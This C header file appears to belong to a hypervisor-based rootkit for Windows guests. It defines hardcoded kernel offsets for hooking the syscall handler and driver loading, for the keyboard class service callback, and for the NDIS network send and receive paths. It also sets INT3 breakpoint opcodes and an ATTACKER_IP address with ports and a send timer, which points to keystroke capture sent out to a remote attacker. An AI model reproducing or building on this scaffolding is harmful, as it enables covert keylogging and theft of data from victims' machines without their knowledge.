#ifndef __HOOKING_H
#define __HOOKING_H

#include <lib/types.h>
#include <vmm/vmm.h>

#define LSTAR_MSR 0xC0000082

#define NTOSKRNL_KiSystemCall64Shadow_OFFSET 0xa19180
#define NTOSKRNL_KiSystemCall64_OFFSET 0x40f000
#define NTOSKRNL_MiDriverLoadSucceeded_OFFSET 0x755773  // actually at 0x755764, but "push rbp" is a bit later
#define NTOSKRNL_PsLoadedModuleList_OFFSET 0xc2a2b0

#define KBDCLASS_SIGNATURE_OFFSET 0x89f8
#define KBDCLASS_KeyboardClassServiceCallback_OFFSET 0x5583 // actually at 0x5570, but "push rbp" is a bit later

#define NDIS_ndisMSendNBLToMiniportInternal_OFFSET 0x4fbc   // actually at 0x4fb0, but "push rbp" is a bit later
#define NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET 0x4993   // actually at 0x4990, but "push r12" is a bit later


#define PUSH_RBP 0x55
#define PUSH_R12 0x5441
#define INT3_OPCODE 0xcc
#define INT3 0x3

extern void handle_lstar_write(uint64_t lstar);
extern void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state);

#define KLDR_DATA_TABLE_ENTRY_Flink(x) (x)
#define KLDR_DATA_TABLE_ENTRY_Blink(x) ((x)+8)
#define KLDR_DATA_TABLE_ENTRY_DllBase(x) ((x)+0x30)
#define KLDR_DATA_TABLE_ENTRY_BaseDllName(x) ((x)+0x58)

#define UNICODE_STRING_Length(x) (x)
#define UNICODE_STRING_Buffer(x) ((x)+8)

#define ATTACKER_IP 0xac1cb73f  // 172.28.183.63
#define SRC_PORT 49321
#define DST_PORT 49324

#define SEND_TIMER_TIME 0x2ffffff
#define IMMEDIATE_SENDING

extern qword_t find_windows_module(wchar_t *name, uint16_t len);
extern uint64_t guest_virtual_to_physical(uint64_t addr);

#endif